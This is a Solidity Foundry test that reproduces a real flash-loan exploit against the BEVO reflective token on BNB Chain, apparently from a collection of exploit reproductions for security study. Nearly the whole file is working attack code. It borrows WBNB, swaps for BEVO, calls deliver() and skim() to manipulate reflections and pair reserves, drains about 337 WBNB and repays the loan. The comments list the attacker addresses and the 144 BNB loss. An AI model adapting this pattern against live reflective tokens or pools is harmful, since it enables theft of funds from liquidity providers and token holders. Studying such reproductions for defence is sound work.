// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Total lost: 144 BNB
// Frontrunner: https://bscscan.com/address/0xd3455773c44bf0809e2aeff140e029c632985c50
// Original Attacker: https://bscscan.com/address/0x68fa774685154d3d22dec195bc77d53f0261f9fd
// Frontrunner Contract: https://bscscan.com/address/0xbec576e2e3552f9a1751db6a4f02e224ce216ac1
// Original Attack Contract: https://bscscan.com/address/0xbf7fc9e12bcd08ec7ef48377f2d20939e3b4845d
// Vulnerable Contract: https://bscscan.com/address/0xc6cb12df4520b7bf83f64c79c585b8462e18b6aa
// Attack Tx: https://bscscan.com/tx/0xb97502d3976322714c828a890857e776f25c79f187a32e2d548dda1c315d2a7d

// @Analysis
// https://twitter.com/QuillAudits/status/1620377951836708865

contract BEVOExploit is Test {
    IERC20 private constant wbnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    reflectiveERC20 private constant bevo = reflectiveERC20(0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa);
    IUniswapV2Pair private constant wbnb_usdc = IUniswapV2Pair(0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b);
    IUniswapV2Pair private constant bevo_wbnb = IUniswapV2Pair(0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633);
    IPancakeRouter private constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 25_230_702);

        cheats.label(address(wbnb), "WBNB");
        cheats.label(address(bevo), "BEVO");
        cheats.label(address(wbnb_usdc), "PancakePair: WBNB-USDC");
        cheats.label(address(bevo_wbnb), "PancakePair: BEVO-WBNB");
        cheats.label(address(router), "PancakeRouter");
    }

    function testExploit() external {
        // flashloan WBNB from PancakePair
        wbnb.approve(address(router), type(uint256).max);
        wbnb_usdc.swap(0, 192.5 ether, address(this), new bytes(1));
        emit log_named_decimal_uint("WBNB balance after exploit", wbnb.balanceOf(address(this)), 18);
    }

    function pancakeCall(
        address, /*sender*/
        uint256, /*amount0*/
        uint256, /*amount1*/
        bytes calldata /*data*/
    ) external {
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(bevo);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnb.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        bevo.deliver(bevo.balanceOf(address(this)));
        bevo_wbnb.skim(address(this));
        bevo.deliver(bevo.balanceOf(address(this)));
        bevo_wbnb.swap(337 ether, 0, address(this), "");

        wbnb.transfer(address(wbnb_usdc), 193 ether);
    }
}
/* -------------------- Interface -------------------- */

interface reflectiveERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function deliver(uint256 tAmount) external;
}
